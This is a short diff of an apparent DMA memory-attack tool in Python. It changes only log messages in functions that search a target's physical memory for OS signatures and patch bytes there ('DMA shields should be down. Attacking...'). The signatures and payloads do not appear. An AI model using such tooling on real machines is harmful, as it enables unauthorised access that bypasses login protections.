@@ -131,8 +131,8 @@ def patch(device, address, chunks):
             device.write(realaddress, patch)
             read = device.read(realaddress, len(patch))
             if settings.verbose:
-                msg('*', 'Data written: 0x' + bytes2hexstr(patch))
-                msg('*', 'Data read:    0x' + bytes2hexstr(read))
+                msg('*', 'Data written: ' + bytes2hexstr(patch))
+                msg('*', 'Data read:    ' + bytes2hexstr(read))
             if  read != patch:
                 success = False
     return success
@@ -268,7 +268,7 @@ def attack(targets):
         memsize = settings.memsize
     
     # Perform parallel search for all signatures for each OS at the known offsets
-    msg('*', 'DMA shields down. Attacking...')
+    msg('*', 'DMA shields should be down. Attacking...')
     address, chunks = searchanddestroy(device, target, memsize)
     if not address:
         # TODO: Fall-back sequential search?
@@ -277,7 +277,7 @@ def attack(targets):
     # Signature found, let's patch
     mask = 0xfffff000 # Mask away the lower bits to find the page number
     page = int((address & mask) / settings.PAGESIZE)
-    msg('*', 'Signature found at {0:#x} (@page # {1})'.format(address, page))
+    msg('*', 'Signature found at {0:#x} (in page # {1})'.format(address, page))
     if not settings.dry_run:
         success = patch(device, address, chunks)
         if success:
